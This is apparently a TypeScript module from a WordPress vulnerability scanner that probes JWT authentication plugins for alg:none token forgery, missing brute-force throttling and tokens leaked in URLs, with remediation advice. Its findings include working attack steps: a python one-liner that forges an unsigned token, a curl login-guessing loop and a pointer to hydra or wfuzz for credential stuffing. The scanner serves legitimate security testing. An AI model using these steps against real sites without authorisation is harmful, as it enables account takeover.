import type { ModuleResult, ScanState } from '../types.js';
import { fetchURL, finding, moduleResult, normalizeTarget, parallelProbe} from '../utils.js';

const MODULE_NAME = 'JWT Auth Testing';

function b64url(s: string): string {
  return btoa(s).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
}

function craftNoneToken(): string {
  const header = b64url(JSON.stringify({ alg: 'none', typ: 'JWT' }));
  const payload = b64url(JSON.stringify({ data: { user: { id: 1 }, status: 'ok' } }));
  return `${header}.${payload}.`;
}

export async function run(target: string, _state?: ScanState): Promise<ModuleResult> {
  const start = Date.now();
  target = normalizeTarget(target);
  const findings: ReturnType<typeof finding>[] = [];
  const errors: string[] = [];

  let jwtPluginFound = false;
  let jwtEndpoint: string | null = null;
  const tokenUrl = `${target}/wp-json/jwt-auth/v1/token`;

  // Test 1: JWT plugin detection
  try {
    const r = await fetchURL(tokenUrl);
    if (r && [200, 400, 405].includes(r.status)) {
      try {
        const data = await r.json() as Record<string, unknown>;
        if ('code' in data || 'message' in data || 'token' in data) {
          jwtPluginFound = true;
          jwtEndpoint = tokenUrl;
        }
      } catch {
        if ([400, 405].includes(r.status)) {
          jwtPluginFound = true;
          jwtEndpoint = tokenUrl;
        }
      }
    }

    const simpleUrl = `${target}/wp-json/simple-jwt-login/v1/autologin`;
    const r2 = await fetchURL(simpleUrl);
    if (r2 && r2.status !== 404) {
      try {
        const data2 = await r2.json() as Record<string, unknown>;
        if ('success' in data2 || 'error' in data2 || 'code' in data2) {
          jwtPluginFound = true;
          if (!jwtEndpoint) jwtEndpoint = simpleUrl;
        }
      } catch { /* ignore */ }
    }

    const usersUrl = `${target}/wp-json/wp/v2/users`;
    const r3 = await fetchURL(usersUrl, { headers: { Authorization: 'Bearer invalid_token_jwp_test' } });
    if (r3?.status === 401) {
      try {
        const data3 = await r3.json() as Record<string, unknown>;
        if (String(data3.code ?? '').toLowerCase().includes('jwt')) jwtPluginFound = true;
      } catch { /* ignore */ }
    }

    if (jwtPluginFound) {
      findings.push(finding(
        'JWT_AUTH_PLUGIN_DETECTED',
        'INFO',
        jwtEndpoint ?? `${target}/wp-json/`,
        'JWT authentication plugin detected — test for algorithm confusion and token forgery attacks',
        {
          replication_steps: [
            `curl -s "${tokenUrl}"`,
            'Observe 400/405 JSON error confirming JWT auth plugin is active.',
            'Proceed: test alg:none, brute force token endpoint, token in URL.',
          ],
          remediation: 'Keep JWT plugin updated. Enforce HS256/RS256 algorithm only. Implement rate limiting on the token endpoint.',
          evidence: `JWT endpoint detected at ${jwtEndpoint ?? tokenUrl}`,
        },
      ));
    }
  } catch (e) {
    errors.push(String(e));
  }

  // Test 2: alg:none attack
  if (jwtPluginFound) {
    try {
      const noneToken = craftNoneToken();
      const meUrl = `${target}/wp-json/wp/v2/users/me`;
      const r = await fetchURL(meUrl, { headers: { Authorization: `Bearer ${noneToken}` } });
      if (r?.status === 200) {
        try {
          const data = await r.json() as Record<string, unknown>;
          if ('id' in data || 'name' in data) {
            findings.push(finding(
              'JWT_ALG_NONE_ACCEPTED',
              'CRITICAL',
              meUrl,
              'JWT alg:none accepted — tokens can be forged without signature',
              {
                replication_steps: [
                  '# Craft alg:none token:',
                  "python3 -c \"import base64,json; h=base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode(); p=base64.urlsafe_b64encode(json.dumps({'data':{'user':{'id':1},'status':'ok'}}).encode()).rstrip(b'=').decode(); print(f'{h}.{p}.')\"",
                  `curl -s "${meUrl}" -H 'Authorization: Bearer <none_token>'`,
                  'Observe HTTP 200 with user data — unsigned token accepted.',
                ],
                remediation: 'Explicitly reject tokens with alg=none. Pin accepted algorithms to HS256 or RS256 in JWT plugin config.',
                evidence: `alg:none forged token returned HTTP 200 (id=${data.id})`,
              },
            ));
          }
        } catch { /* ignore */ }
      }
    } catch (e) {
      errors.push(String(e));
    }
  }

  // Test 3: Token endpoint brute force protection
  if (jwtEndpoint && jwtEndpoint.includes('jwt-auth')) {
    try {
      const timings: number[] = [];
      const errorCodes: string[] = [];
      for (let i = 0; i < 5; i++) {
        const t0 = Date.now();
        const r = await fetchURL(jwtEndpoint, {
          method: 'POST',
          body: JSON.stringify({ username: 'admin', password: 'wrong_password_jwp_test' }),
          headers: { 'Content-Type': 'application/json' },
        });
        timings.push((Date.now() - t0) / 1000);
        if (r) {
          try {
            const d = await r.json() as Record<string, unknown>;
            errorCodes.push(String(d.code ?? ''));
          } catch { errorCodes.push(''); }
        }
      }
      const fast = timings.filter((t) => t < 2.0).length;
      const uniqueCodes = new Set(errorCodes.filter(Boolean));
      if (fast >= 5 && uniqueCodes.size <= 1) {
        const avg = timings.reduce((a, b) => a + b, 0) / timings.length;
        findings.push(finding(
          'JWT_NO_BRUTE_FORCE_PROTECTION',
          'MEDIUM',
          jwtEndpoint,
          'JWT auth token endpoint has no brute force protection — rapid repeated auth attempts are not throttled',
          {
            replication_steps: [
              `for i in $(seq 1 5); do curl -s -X POST "${jwtEndpoint}" -H 'Content-Type: application/json' -d '{"username":"admin","password":"guess$i"}'; echo; done`,
              'Observe all 5 requests return immediately without lockout or delay.',
              'Use hydra or wfuzz to automate credential stuffing against this endpoint.',
            ],
            remediation: 'Install a rate limiting plugin or configure server-level throttling for the token endpoint. Implement account lockout after N failures.',
            evidence: `5 rapid auth attempts — no lockout detected (avg ${avg.toFixed(2)}s/req, codes: ${JSON.stringify([...uniqueCodes].slice(0, 3))})`,
          },
        ));
      }
    } catch (e) {
      errors.push(String(e));
    }
  }

  // Test 4: JWT token in URL
  try {
    const r = await fetchURL(`${target}/wp-json/`);
    if (r?.status === 200) {
      const text = await r.text();
      if (/[?&](jwt|token|auth_token)=[A-Za-z0-9._\-]{20,}/.test(text)) {
        const m = text.match(/[?&](jwt|token|auth_token)=([A-Za-z0-9._\-]{20,})/);
        findings.push(finding(
          'JWT_TOKEN_IN_URL',
          'MEDIUM',
          `${target}/wp-json/`,
          'JWT token found in URL parameter — susceptible to leakage in server logs, browser history, and Referer headers',
          {
            replication_steps: [
              `curl -s "${target}/wp-json/" | grep -oE '[?&](jwt|token)=[A-Za-z0-9._-]+'`,
              'Observe JWT token embedded in a URL in the response body.',
              'Tokens in URLs are logged by web servers, proxies, and CDNs.',
            ],
            remediation: 'Transmit JWT tokens exclusively via the Authorization header, never in URL parameters.',
            evidence: `Token param '${m?.[1] ?? 'token'}' found in /wp-json/ response`,
          },
        ));
      }
    }

    await parallelProbe(['/', '/wp-login.php'], async (path) => {
      const r2 = await fetchURL(`${target}${path}`);
      if (r2 && /[?&](jwt|token)=[A-Za-z0-9._\-]{20,}/.test(r2.url)) {
        findings.push(finding(
          'JWT_TOKEN_IN_URL',
          'MEDIUM',
          r2.url,
          'JWT token found in redirect URL — susceptible to leakage in logs and Referer headers',
          {
            replication_steps: [
              `curl -sI "${target}${path}" -L`,
              'Observe redirect chain contains ?jwt= or ?token= with a token value.',
            ],
            remediation: 'Avoid passing JWT tokens as URL parameters. Use Authorization: Bearer header instead.',
            evidence: `Token detected in URL: ${r2.url.slice(0, 100)}`,
          },
        ));
      }
    });
  } catch (e) {
    errors.push(String(e));
  }

  // Test 5: Expired token guidance (INFO)
  if (jwtPluginFound) {
    const ep = jwtEndpoint ?? `${target}/wp-json/jwt-auth/v1/token`;
    findings.push(finding(
      'JWT_EXPIRY_TEST_GUIDANCE',
      'INFO',
      ep,
      'JWT token expiry enforcement should be tested manually — obtain a valid token, wait past expiry, and verify it is rejected',
      {
        replication_steps: [
          `1. Obtain a valid JWT: curl -s -X POST "${ep}" -d '{"username":"USER","password":"PASS"}'`,
          "2. Decode payload: echo 'PAYLOAD' | base64 -d | python3 -m json.tool",
          "3. Note the 'exp' claim timestamp.",
          `4. After expiry, retry: curl -s "${target}/wp-json/wp/v2/users/me" -H 'Authorization: Bearer OLD_TOKEN'`,
          '5. Confirm server returns 401 (not 200).',
        ],
        remediation: 'Enable validate_expiry in JWT plugin settings. Set short token lifetimes (≤1 hour) and implement refresh tokens.',
        evidence: 'JWT plugin detected — manual expiry testing recommended',
      },
    ));
  }

  return moduleResult(MODULE_NAME, target, findings, errors, start);
}
